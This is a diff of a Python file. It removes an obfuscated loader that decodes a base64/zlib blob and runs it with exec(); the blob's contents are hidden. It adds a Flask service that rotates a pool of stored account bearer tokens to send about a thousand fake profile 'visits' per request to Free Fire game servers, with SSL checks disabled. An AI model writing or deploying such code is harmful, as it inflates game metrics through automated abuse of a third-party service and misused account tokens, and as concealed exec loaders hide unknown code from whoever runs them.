@@ -1,17 +1,143 @@
-# Encoded Python File
-import base64
-import zlib
-import sys
+#This was made by JOBAYAR AHMED 
+#This was made by JOBAYAR AHMED 
+#This was made by JOBAYAR AHMED 
+#This was made by JOBAYAR AHMED 
+#This was made by JOBAYAR AHMED 
+from flask import Flask, jsonify
+import aiohttp
+import asyncio
+import json
+from byte import encrypt_api, Encrypt_ID
+from visit_count_pb2 import Info  # Import the generated protobuf class
 
-def decode_and_run():
-    encoded_data = """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"""
+app = Flask(__name__)
+
+def load_tokens(server_name):
     try:
-        decoded_data = base64.b64decode(encoded_data.encode('utf-8'))
-        decompressed_code = zlib.decompress(decoded_data).decode('utf-8')
-        exec(decompressed_code, globals())
+        if server_name == "IND":
+            path = "token_ind.json"
+        elif server_name in {"BR", "US", "SAC", "NA"}:
+            path = "token_br.json"
+        else:
+            path = "token_bd.json"
+
+        with open(path, "r") as f:
+            data = json.load(f)
+
+        tokens = [item["token"] for item in data if "token" in item and item["token"] not in ["", "N/A"]]
+        return tokens
     except Exception as e:
-        print(f"Error decoding: {e}")
-        sys.exit(1)
+        app.logger.error(f"❌ Token load error for {server_name}: {e}")
+        return []
+
+def get_url(server_name):
+    if server_name == "IND":
+        return "https://client.ind.freefiremobile.com/GetPlayerPersonalShow"
+    elif server_name in {"BR", "US", "SAC", "NA"}:
+        return "https://client.us.freefiremobile.com/GetPlayerPersonalShow"
+    else:
+        return "https://clientbp.ggblueshark.com/GetPlayerPersonalShow"
+
+def parse_protobuf_response(response_data):
+    try:
+        info = Info()
+        info.ParseFromString(response_data)
+        
+        player_data = {
+            "uid": info.AccountInfo.UID if info.AccountInfo.UID else 0,
+            "nickname": info.AccountInfo.PlayerNickname if info.AccountInfo.PlayerNickname else "",
+            "likes": info.AccountInfo.Likes if info.AccountInfo.Likes else 0,
+            "region": info.AccountInfo.PlayerRegion if info.AccountInfo.PlayerRegion else "",
+            "level": info.AccountInfo.Levels if info.AccountInfo.Levels else 0
+        }
+        return player_data
+    except Exception as e:
+        app.logger.error(f"❌ Protobuf parsing error: {e}")
+        return None
+
+async def visit(session, url, token, uid, data):
+    headers = {
+        "ReleaseVersion": "OB51",
+        "X-GA": "v1 1",
+        "Authorization": f"Bearer {token}",
+        "Host": url.replace("https://", "").split("/")[0]
+    }
+    try:
+        async with session.post(url, headers=headers, data=data, ssl=False) as resp:
+            if resp.status == 200:
+                response_data = await resp.read()
+                return True, response_data
+            else:
+                return False, None
+    except Exception as e:
+        app.logger.error(f"❌ Visit error: {e}")
+        return False, None
+
+async def send_until_1000_success(tokens, uid, server_name, target_success=1000):
+    url = get_url(server_name)
+    connector = aiohttp.TCPConnector(limit=0)
+    total_success = 0
+    total_sent = 0
+    first_success_response = None
+    player_info = None
+
+    async with aiohttp.ClientSession(connector=connector) as session:
+        encrypted = encrypt_api("08" + Encrypt_ID(str(uid)) + "1801")
+        data = bytes.fromhex(encrypted)
+
+        while total_success < target_success:
+            batch_size = min(target_success - total_success, 1000)
+            tasks = [
+                asyncio.create_task(visit(session, url, tokens[(total_sent + i) % len(tokens)], uid, data))
+                for i in range(batch_size)
+            ]
+            results = await asyncio.gather(*tasks)
+            
+            if first_success_response is None:
+                for success, response in results:
+                    if success and response is not None:
+                        first_success_response = response
+                        player_info = parse_protobuf_response(response)
+                        break
+            
+            batch_success = sum(1 for r, _ in results if r)
+            total_success += batch_success
+            total_sent += batch_size
+
+            print(f"Batch sent: {batch_size}, Success in batch: {batch_success}, Total success so far: {total_success}")
+
+    return total_success, total_sent, player_info
+
+@app.route('/<string:server>/<int:uid>', methods=['GET'])
+def send_visits(server, uid):
+    server = server.upper()
+    tokens = load_tokens(server)
+    target_success = 1000
+
+    if not tokens:
+        return jsonify({"error": "❌ No valid tokens found"}), 500
+
+    print(f"🚀 Sending visits to UID: {uid} using {len(tokens)} tokens")
+    print(f"Waiting for total {target_success} successful visits...")
+
+    total_success, total_sent, player_info = asyncio.run(send_until_1000_success(
+        tokens, uid, server,
+        target_success=target_success
+    ))
+
+    if player_info:
+        player_info_response = {
+            "fail": target_success - total_success,
+            "level": player_info.get("level", 0),
+            "likes": player_info.get("likes", 0),
+            "nickname": player_info.get("nickname", ""),
+            "region": player_info.get("region", ""),
+            "success": total_success,
+            "uid": player_info.get("uid", 0)
+        }
+        return jsonify(player_info_response), 200
+    else:
+        return jsonify({"error": "Could not decode player information"}), 500
 
 if __name__ == "__main__":
-    decode_and_run()
+    app.run(host="0.0.0.0", port=5000)
